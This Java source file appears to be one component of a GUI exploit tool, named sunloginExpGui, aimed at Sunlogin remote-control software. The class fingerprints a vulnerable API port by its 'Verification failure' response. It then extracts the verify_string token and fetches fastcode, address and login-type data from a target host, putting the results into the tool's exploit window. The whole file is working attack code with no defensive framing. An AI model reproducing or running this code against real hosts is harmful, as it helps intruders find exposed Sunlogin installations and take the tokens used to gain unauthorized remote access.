package sunloginExpGui.exploit;

import com.github.kevinsawicki.http.HttpRequest;
import com.google.gson.Gson;

import sunloginExpGui.mainJFrame.SunloginExpGui;

public class GetSunloginInfo {
	
	String url;
	int httpTimeout;
	
	public GetSunloginInfo(String url,int httpTimeout) {
		this.url = url;
		this.httpTimeout = httpTimeout;
	}
	
	public static String verifyString = "";
	
	class VerifyStringClass{
		public int __code;
		public String enabled;
		public String verify_string;
		public int code;
	}
	
	public boolean get_sunlogin_vuln_api_port() {
		
		//HttpRequest responseRst = HttpRequest.get("https://www.baidu.com");
		String ip = url.split(":")[0];
		int port = Integer.valueOf(url.split(":")[1]).intValue();
		//ipWithPort.split(":")[0],Integer.valueOf(ipWithPort.split(":")[1]).intValue(),httpTimeout
		try {
			
			HttpRequest responseRst = HttpRequest.get("http://"+ip+":"+port).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			String responseBody = responseRst.body();
			String sunloginVulnApiPortFingerprint = "{\"success\":false,\"msg\":\"Verification failure\"}";
			if(responseBody.contains(sunloginVulnApiPortFingerprint)) {
				return true;
			}
			else {
				return false;
			}
		} catch (Exception e) {
			// TODO: handle exception
			return false;
		}
		
	}
	
	public String get_verify_string() {
		//String verifyString = "";
		//JSONObject jo = new JSONObject();
		
		try {
			
			HttpRequest responseRst = HttpRequest.get(url).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			String responseBody = responseRst.body();
			
			System.out.println(responseBody);
			
			VerifyStringClass vsc = new Gson().fromJson(responseBody, VerifyStringClass.class);
			verifyString = vsc.verify_string;
			
			System.out.println(verifyString);
			
			SunloginExpGui.verifyStringField.setText(verifyString);
			
			return verifyString;
			
			
		} catch (Exception e) {
			// TODO: handle exception
			SunloginExpGui.expResultTextArea.append("get_verify_string failed. Caused exception.\n");
			return "";
		}
		
		
	}
	
	
	
	public String get_fastcode() {
		
		/*
		class FastCodeClass{
			public String fastcode;
		}
		*/
		String fastcode = "";
		
		try {
			
			HttpRequest responseRst = HttpRequest.get(url).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			String responseBody = responseRst.body();
			fastcode = responseBody;
			
		} catch (Exception e) {
			// TODO: handle exception
			SunloginExpGui.expResultTextArea.append("get_fastcode failed. Caused exception.\n");
		}
		
		
		//FastCodeClass fcc = new Gson().fromJson(responseBody, FastCodeClass.class);
		return fastcode;
	}
	
	
	public String get_address() {
		
		String sunloginAddress = "";
		
		try {
			
			HttpRequest responseRst = HttpRequest.get(url).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			sunloginAddress = responseRst.body();
		} catch (Exception e) {
			// TODO: handle exception
			SunloginExpGui.expResultTextArea.append("get_address failed. Caused exception.\n");
		}
		
		
		return sunloginAddress;
	}
	
	
	public String get_login_type() {
		String loginType = "";
		
		try {
			HttpRequest responseRst = HttpRequest.get(url).connectTimeout(httpTimeout).readTimeout(httpTimeout);
			loginType = responseRst.body();
		} catch (Exception e) {
			// TODO: handle exception
			SunloginExpGui.expResultTextArea.append("get_login_type failed. Caused exception.\n");
		}
		
		
		return loginType;
	}
	
	
}
